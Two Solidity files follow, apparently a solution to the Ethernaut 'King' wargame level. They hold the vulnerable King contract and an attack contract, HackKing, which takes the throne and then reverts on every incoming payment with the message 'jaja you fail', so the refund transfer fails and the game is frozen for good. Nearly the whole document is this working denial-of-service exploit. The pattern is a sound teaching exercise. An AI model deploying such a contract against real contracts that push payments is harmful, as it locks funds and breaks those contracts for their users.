// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "./King.sol";

contract HackKing {
    King public king = King(payable(0x7BB4BB82c116b67836197793a60999D34A7A7AE8));
    
    // Create a malicious contract and seed it with some Ethers
    function BadKing() public payable {
    }
    
    // This should trigger King fallback(), making this contract the king
    function becomeKing(uint toPay) public {
        address(king).call{value: toPay, gas:4000000}("");
    }
    
    function transferBack(address myAddress,uint toPay) public {
        address(myAddress).call{value: toPay, gas:4000000}("");
    }

    // This function fails "king.transfer" trx from Ethernaut
    receive() external payable {
        revert("jaja you fail");
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}